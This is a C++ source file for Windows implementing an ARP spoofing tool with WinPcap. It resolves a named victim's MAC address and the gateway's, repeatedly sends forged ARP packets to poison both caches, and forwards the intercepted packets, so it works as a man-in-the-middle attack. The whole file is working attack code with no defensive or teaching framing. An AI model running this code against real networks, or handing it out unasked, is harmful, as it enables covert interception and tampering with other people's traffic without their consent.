#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "arpspoof.h"
/*
	encode the string	
*/
std::string Arpspoof::unicode_to_str(wchar_t *unistr) {
	char buf[100];
	int res = WideCharToMultiByte(CP_ACP, 0, unistr, wcslen(unistr), buf, 100, NULL, NULL);
	return res > 0 ? std::string(buf, res) : std::string();
}
/*
	encode ip to the string
*/
std::string Arpspoof::ip_to_str(const uint8_t ip[4]) {
	return std::to_string(ip[0]) + "." + std::to_string(ip[1]) + "." + std::to_string(ip[2]) + "." + std::to_string(ip[3]);
}
/*
		encode mac to the string
*/
std::string Arpspoof::mac_to_str(const uint8_t mac[6]) {
	char s[18];
	sprintf_s(s, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	return std::string(s, 17);
}
/*
	find ip interfaces
*/
std::vector<iface_info> Arpspoof::find_ifaces() {
	int i = 0;
	pcap_if_t *alldevs;
	char errbuf[PCAP_ERRBUF_SIZE];
	/* Retrieve the device list */
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	std::unordered_set<std::string> pcap_ifaces;
	for (pcap_if_t *d = alldevs; d; d = d->next) {
		pcap_ifaces.insert(d->name);
	}
	pcap_freealldevs(alldevs);

	ULONG flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_INCLUDE_GATEWAYS;
	ULONG size = 10 * 1024;
	std::vector<uint8_t> buf(size);
	ULONG res = GetAdaptersAddresses(AF_INET, flags, nullptr, (IP_ADAPTER_ADDRESSES *)&buf[0], &size);
	if (res == ERROR_BUFFER_OVERFLOW) {
		buf.resize(size);
		res = GetAdaptersAddresses(AF_INET, flags, nullptr, (IP_ADAPTER_ADDRESSES *)&buf[0], &size);
	}
	if (res != ERROR_SUCCESS) {
		fprintf(stderr, "Can't get list of adapters: %d\n", res);
		exit(1);
	}

	std::vector<iface_info> ifaces;
	IP_ADAPTER_ADDRESSES *p = (IP_ADAPTER_ADDRESSES *)&buf[0];
	for (; p; p = p->Next) {
		if (pcap_ifaces.count(std::string("\\Device\\NPF_") + p->AdapterName) == 0) {
			continue;
		}
		if (p->OperStatus != IfOperStatusUp) {
			continue;
		}
		iface_info ii{};
		ii.ifIndex = p->IfIndex;
		ii.name = std::string("\\Device\\NPF_") + p->AdapterName;
		ii.description = unicode_to_str(p->Description) + " (" + unicode_to_str(p->FriendlyName) + ")";
		memcpy(ii.mac, p->PhysicalAddress, 6);
		if (p->FirstUnicastAddress) {
			memcpy(ii.ip, &((sockaddr_in *)p->FirstUnicastAddress->Address.lpSockaddr)->sin_addr, 4);
			ii.prefixlen = p->FirstUnicastAddress->OnLinkPrefixLength;
		}
		if (p->FirstGatewayAddress) {
			memcpy(ii.gateway, &((sockaddr_in *)p->FirstGatewayAddress->Address.lpSockaddr)->sin_addr, 4);
		}
		ifaces.push_back(std::move(ii));
	}
	return ifaces;
}
/*
print the interfaces
*/
void Arpspoof::print_ifaces(const std::vector<iface_info>& ifaces) {
	int i = 1;
	for (const iface_info& iface : ifaces) {
		printf("%d. %s\t%s\n\t%s/%d gw=%s\n", i, iface.name.c_str(), iface.description.c_str(),
			ip_to_str(iface.ip).c_str(), iface.prefixlen, ip_to_str(iface.gateway).c_str());
		i++;
	}
}
/*
resolve the interfaces to the ip adresses
*/
bool Arpspoof::resolve(const iface_info& iface, const uint8_t ip[4], uint8_t mac[6]) {
	SOCKADDR_INET srcif;
	srcif.Ipv4.sin_family = AF_INET;
	memcpy(&srcif.Ipv4.sin_addr, iface.ip, 4);

	MIB_IPNET_ROW2 row = { 0 };
	row.InterfaceIndex = iface.ifIndex;
	row.Address.Ipv4.sin_family = AF_INET;
	memcpy(&row.Address.Ipv4.sin_addr, ip, 4);

	if (ResolveIpNetEntry2(&row, &srcif) != NO_ERROR) {
		return false;
	}
	if (row.State == NlnsReachable) {
		memcpy(mac, row.PhysicalAddress, 6);
		return true;
	}
	return false;
}

struct EthHeader {
	uint8_t dest[6];
	uint8_t src[6];
	uint16_t ethertype;
};

struct IpHeader {
	uint8_t ihl;
	uint8_t tos;
	uint16_t len;
	uint16_t frag_id;
	uint8_t frag_offs;
	uint8_t ttl;
	uint8_t proto;
	uint16_t csum;
	uint8_t src[4];
	uint8_t dest[4];
};

struct ArpHeader {
	uint16_t htype;
	uint16_t ptype;
	uint8_t hlen;
	uint8_t plen;
	uint16_t op;
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
};
/*
	fill out a arppacket including victim and gateway
*/
void Arpspoof::fill_arp_packet(uint8_t *packet, const uint8_t *victim_ip, const uint8_t *victim_mac, const uint8_t *my_ip, const uint8_t *my_mac) {
	EthHeader *eth = (EthHeader *)packet;
	ArpHeader *arp = (ArpHeader *)(packet + sizeof(EthHeader));

	memcpy(eth->dest, victim_mac, 6);
	memcpy(eth->src, my_mac, 6);
	eth->ethertype = htons(0x0806);

	arp->htype = htons(0x0001);
	arp->ptype = htons(0x0800);
	arp->hlen = 6;
	arp->plen = 4;
	arp->op = htons(1);		// arp request
	memcpy(arp->sender_mac, my_mac, 6);
	memcpy(arp->sender_ip, my_ip, 4);
	memcpy(arp->target_mac, victim_mac, 6);
	memcpy(arp->target_ip, victim_ip, 4);
}
/*
	finish the packets and send them on the datalink
*/
void Arpspoof::handle_packet(pcap_t *pcap, pcap_pkthdr *header, const uint8_t *data, const uint8_t *victim_mac, const uint8_t *victim_ip,
	const uint8_t *target_mac, const uint8_t *my_mac) {
	if (header->caplen != header->len || header->len > 65536) {
		return;
	}
	if (header->len < sizeof(EthHeader) + sizeof(IpHeader)) {
		return;
	}
	EthHeader *eth = (EthHeader *)data;
	if (htons(eth->ethertype) != 0x0800) {
		return;
	}
	if ((memcmp(eth->src, victim_mac, 6) != 0 && memcmp(eth->src, target_mac, 6) != 0) || memcmp(eth->dest, my_mac, 6) != 0) {
		return;
	}

	IpHeader *ip = (IpHeader *)(data + sizeof(EthHeader));
	if (memcmp(ip->src, victim_ip, 4) != 0 && memcmp(ip->dest, victim_ip, 4) != 0) {
		return;
	}

	static uint8_t new_packet[65536];
	memcpy(new_packet, data, header->len);
	if (memcmp(eth->src, victim_mac, 6) == 0) {
		memcpy(new_packet, target_mac, 6);
		memcpy(new_packet + 6, my_mac, 6);
	}
	else {
		memcpy(new_packet, victim_mac, 6);
		memcpy(new_packet + 6, my_mac, 6);
	}

	if (pcap_sendpacket(pcap, new_packet, header->len) != 0) {
		//fprintf(stderr, "Error forwarding packet: %s\n", pcap_geterr(pcap));
		return;
	}
}

/*
the main function to spoof a victim
ressolve his macadresds and spoof the arptable for also gateway and victim ip
*/
void Arpspoof::SendArpReplayForSpoofing(std::string victim)
{
	std::string target;

	uint8_t victimip[4], targetip[4] = { 0 };
	{
		uint32_t a = inet_addr(victim.c_str());
		memcpy(victimip, &a, 4);
	}

	std::string ifacestr;
	std::vector<iface_info> ifaces = find_ifaces();
	int ifaceidx = -1;
	if (ifacestr.empty()) {
		// Find iface with address/netmask matching given victim
		int i = 0;
		for (const iface_info& iface : ifaces) {
			uint32_t ip = (iface.ip[0] << 24) | (iface.ip[1] << 16) | (iface.ip[2] << 8) | iface.ip[3];
			uint32_t ipnet = ip & ~((1 << (32 - iface.prefixlen)) - 1);
			uint32_t vic = (victimip[0] << 24) | (victimip[1] << 16) | (victimip[2] << 8) | victimip[3];
			uint32_t vicnet = vic & ~((1 << (32 - iface.prefixlen)) - 1);
			if (ip != 0 && ipnet == vicnet) {
				if (ifaceidx == -1) {
					ifaceidx = i;
				}
				else {
					//fprintf(stderr, "Several interfaces match victim IP, use -i");
					return;
				}
			}
			i++;
		}
	}
	else {
		// ifacestr is interface index or name
		int index = atoi(ifacestr.c_str());
		if (index == 0) {
			int i = 0;
			for (const iface_info& iface : ifaces) {
				if (iface.name == ifacestr) {
					ifaceidx = i;
					break;
				}
				i++;
			}
		}
		else {
			ifaceidx = index;
		}
	}
	if (ifaceidx < 0 || ifaceidx >= (int)ifaces.size()) {
		//fprintf(stderr, "Can't find interface (explicitly specified or matching victim IP)\n");
		return;
	}
	const iface_info& iface = ifaces[ifaceidx];
	if (target.empty()) {
		memcpy(targetip, iface.gateway, 4);
	}

	printf("Resolving victim and target...\n");

	uint8_t victimmac[6], targetmac[6];
	if (!resolve(iface, victimip, victimmac)) {
		//fprintf(stderr, "Can't resolve victim IP, is it up?\n");
		return;
	}
	if (!resolve(iface, targetip, targetmac)) {
		//fprintf(stderr, "Can't resolve target IP, is it up?\n");
		return;
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *pcap = pcap_open_live(iface.name.c_str(),		// name of the device
		65536,			// snaplen
		1,				// promiscuous mode (nonzero means promiscuous)
		1000,			// read timeout
		errbuf			// error buffer
	);
	if (pcap == NULL) {
		//fprintf(stderr, "Unable to open the adapter. %s is not supported by WinPcap\n", iface.name.c_str());
		return;
	}
	/* Check the link layer. We support only Ethernet for simplicity. */
	if (pcap_datalink(pcap) != DLT_EN10MB)
	{
		//fprintf(stderr, "This program works only on Ethernet networks.\n");
		return;
	}

	uint8_t arp_spoof_victim[42], arp_spoof_target[42];
	fill_arp_packet(arp_spoof_victim, victimip, victimmac, targetip, iface.mac);
	fill_arp_packet(arp_spoof_target, targetip, targetmac, victimip, iface.mac);

	/*printf("Redirecting %s (%s) ---> %s (%s)\n", ip_to_str(victimip).c_str(), mac_to_str(victimmac).c_str(),
		ip_to_str(targetip).c_str(), mac_to_str(targetmac).c_str());*/

	time_t next_arp_time = 0;
	while (!stop) {
		time_t now = time(nullptr);
		if (now >= next_arp_time) {
			next_arp_time = now + 2;
			if (pcap_sendpacket(pcap, arp_spoof_victim, sizeof(arp_spoof_victim)) != 0) {
				//fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
				return;
			}
			if (pcap_sendpacket(pcap, arp_spoof_target, sizeof(arp_spoof_target)) != 0) {
				//fprintf(stderr, "Error sending packet2: %s\n", pcap_geterr(pcap));
				return;
			}
		}

		pcap_pkthdr *header;
		const uint8_t *pkt_data;
		int res = pcap_next_ex(pcap, &header, &pkt_data);
		if (res < 0) {
			//printf("error\n");
			break;
		}
		else if (res == 0) {
			// timeout
			continue;
		}
		handle_packet(pcap, header, pkt_data, victimmac, victimip, targetmac, iface.mac);
	}
}


